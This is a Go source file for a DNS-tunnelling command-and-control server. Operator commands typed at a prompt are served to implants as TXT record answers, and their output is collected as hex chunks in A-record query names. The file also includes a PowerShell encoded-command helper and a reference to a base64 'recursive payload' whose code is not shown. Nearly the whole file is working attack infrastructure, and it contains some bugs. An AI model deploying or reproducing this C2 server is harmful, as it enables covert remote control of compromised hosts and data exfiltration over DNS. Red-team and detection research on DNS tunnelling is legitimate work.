package main

import (
	"bufio"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

var c2Domain = ""
var cm comandManager

func main() {
	//This code is very janky, and mostly written while half-drunk
	//Props to sudosammy for working out how to do the dns stuff with knary
	//- much of the code is based on the framework he laid out there.
	flag.StringVar(&c2Domain, "d", "", "Domain to assign")

	flag.Parse()

	if c2Domain == "" {
		flag.PrintDefaults()
		panic("No")
	}

	uuidChan := make(chan string, 20)

	wg := &sync.WaitGroup{}

	cm = comandManager{
		CommandMap: make(map[string]Command),
		CMMutex:    &sync.RWMutex{},
	}

	fmt.Println("cats")
	s, _ := base64.StdEncoding.DecodeString(getRecursivePayload(c2Domain))
	fmt.Println(string(s))
	dns.HandleFunc(os.Getenv(c2Domain)+".", func(w dns.ResponseWriter, r *dns.Msg) { HandleDNS(w, r, "127.0.0.1", uuidChan) })
	wg.Add(1)
	go AcceptDNS(wg, uuidChan)
	wg.Add(1)
	go cli(wg, uuidChan)
	wg.Wait()
}

type comandManager struct {
	CommandMap     map[string]Command
	CMMutex        *sync.RWMutex
	WaitingCommand string
}

func (cm *comandManager) getCommand(c string) Command {
	cm.CMMutex.RLock()
	defer cm.CMMutex.RUnlock()
	if v, ok := cm.CommandMap[c]; ok {
		return v
	}
	return Command{}
}

func (cm comandManager) getCommandToSend() string {
	cm.CMMutex.RLock()
	defer cm.CMMutex.RUnlock()
	return cm.WaitingCommand
}

type response struct {
	Chunks      []chunk
	TotalChunks int64
	ReadChunks  int64
}

type chunk struct {
	Body string
	Num  int64
}

type Command struct {
	SentValue string
	UUID      string
	Response  response
}

func monitorResponse(wg *sync.WaitGroup, uuidChan chan string) {
	defer wg.Done()

	uuid := <-uuidChan
	for {
		c := cm.getCommand(uuid)
		if c.Response.IsDone() {
			fmt.Println(c.Response.ReadResposne())
			break
		}
		time.Sleep(time.Second * 1)
	}
}

func (cm *comandManager) setCommandToSend(s string) {
	cm.CMMutex.Lock()
	defer cm.CMMutex.Unlock()
	cm.WaitingCommand = s
}

func cli(wg *sync.WaitGroup, uuidChan chan string) {
	lolwg := &sync.WaitGroup{}
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print(">")
	for scanner.Scan() {
		if scanner.Text() == "" {
			continue
		}
		lolwg.Add(1)
		cm.setCommandToSend(scanner.Text())
		//cmd = scanner.Text()
		go monitorResponse(lolwg, uuidChan)
		lolwg.Wait()
		fmt.Print(">")
	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "reading standard input:", err)
	}
}

func powershellEncode(data string) string {
	blankCommand := ""
	data = strings.Replace(data, string("\xef"), "", -1)
	data = strings.Replace(data, string("\xbb"), "", -1)
	data = strings.Replace(data, string("\xbf"), "", -1)
	for _, char := range data {

		blankCommand += string(char) + "\x00"
	}
	return base64.StdEncoding.EncodeToString([]byte(blankCommand))
}

func AcceptDNS(wg *sync.WaitGroup, uuidChan chan string) {
	// start DNS server
	server := &dns.Server{Addr: os.Getenv("BIND_ADDR") + ":53", Net: "udp"}
	err := server.ListenAndServe()

	if err != nil {
		log.Fatal(err)
	}

	defer server.Shutdown()
	wg.Done()
}

func HandleDNS(w dns.ResponseWriter, r *dns.Msg, EXT_IP string, uuidChan chan string) {
	// many thanks to the original author of this function
	m := &dns.Msg{
		Compress: false,
	}
	m.SetReply(r)
	m.Authoritative = true
	m.RecursionAvailable = true
	parseDNS(m, w.RemoteAddr().String(), EXT_IP, uuidChan)
	w.WriteMsg(m)
}

func (cm *comandManager) UpdateCmd(uuid, maxchunks, thischunk, vals string) {
	cm.CMMutex.Lock()
	defer cm.CMMutex.Unlock()
	c := cm.CommandMap[uuid]

	cn, e := strconv.ParseInt(thischunk, 10, 64)
	if e != nil {
		fmt.Println("Bad chunk number: ", e)
		return
	}
	mc, e := strconv.ParseInt(thischunk, 10, 64)
	if e != nil {
		fmt.Println("Bad max chunk number: ", e)
		return
	}
	c.Response.TotalChunks = mc
	c.Response.AddChunk(cn, vals)
	c.Response.ReadChunks++
	cm.CommandMap[uuid] = c

}

func (r *response) AddChunk(cnum int64, val string) {
	r.Chunks = append(r.Chunks, chunk{Body: val, Num: cnum})
}

func (r response) IsDone() bool {
	if r.TotalChunks == 0 || r.TotalChunks > r.ReadChunks {
		return false
	}
	return true
}

func (r response) ReadResposne() string {
	//sort chunks
	rval := ""
	sort.Slice(r.Chunks, func(i, j int) bool {
		if r.Chunks[i].Num < r.Chunks[j].Num {
			return true
		}
		return false
	})
	for _, x := range r.Chunks {
		rval += x.Body
	}
	v, e := hex.DecodeString(rval)
	if e != nil {
		fmt.Println("ReadResponse Error:", e)
	}
	return string(v)
}

func parseDNS(m *dns.Msg, ipaddr string, EXT_IP string, uuidChan chan string) {
	// for each DNS question to our nameserver
	// there can be multiple questions in the question section of a single request
	for _, q := range m.Question {

		//received a A request (probably a client returning a response)
		if q.Qtype == dns.TypeA {
			z := strings.Split(q.Name, ".")

			//60char.chunknumber.maxmessagechunks.uid.c2.rce.life
			if len(z) < len(strings.Split(c2Domain, ".")) {
				continue
			}
			z = z[:len(z)-(len(strings.Split(c2Domain, "."))+1)]
			if len(z) != 4 {
				fmt.Println("oh boy")
				continue
			}
			//last value is the uid of the command
			uid := z[len(z)-1]
			//next is the max chunks
			maxChunks := z[len(z)-2]
			//then the chunk being sent
			thisChunk := z[len(z)-3]
			//and finally our payload
			payload := z[len(z)-4]
			cm.UpdateCmd(uid, maxChunks, thisChunk, payload)
		}
		//received a TXT request (probably a client looking for commands)
		if q.Qtype == dns.TypeTXT {
			//check if we have a pending command to send
			z := strings.Split(q.Name, ".")
			//uid.c2.domain.here.please
			if len(z) < len(strings.Split(c2Domain, ".")) {
				continue
			}
			z = z[:len(z)-(len(strings.Split(c2Domain, "."))+1)]
			uuid := z[len(z)-1]

			r := dns.TXT{}
			r.Hdr = dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    10,
			}
			com2send := cm.getCommandToSend()
			r.Txt = []string{com2send}
			rr, _ := dns.NewRR(r.String())

			m.Answer = append(m.Answer, rr)

			if com2send != "NoCMD" {
				//add to command manager
				c := Command{
					SentValue: com2send,
					UUID:      uuid,
					Response:  response{},
				}
				cm.AddCommand(c)
				uuidChan <- uuid
			}
			cm.setCommandToSend("NoCMD")

		}
	}
}

func (cm *comandManager) AddCommand(c Command) {
	cm.CMMutex.Lock()
	defer cm.CMMutex.Unlock()
	cm.CommandMap[c.UUID] = c
}
